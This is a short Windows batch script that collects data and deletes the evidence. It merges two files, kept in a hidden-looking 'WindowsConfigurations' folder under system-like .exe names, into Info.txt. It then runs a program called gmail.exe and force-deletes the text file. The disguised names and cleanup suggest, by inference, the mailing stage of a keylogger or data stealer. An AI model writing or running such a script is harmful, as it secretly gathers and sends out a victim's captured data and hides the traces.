@echo off
type %homedrive%\%homepath%\WindowsConfigurations\winv32.exe>> Info.txt
type %homedrive%\%homepath%\WindowsConfigurations\config32.exe>>Info.txt
gmail.exe
del /f info.txt
exit

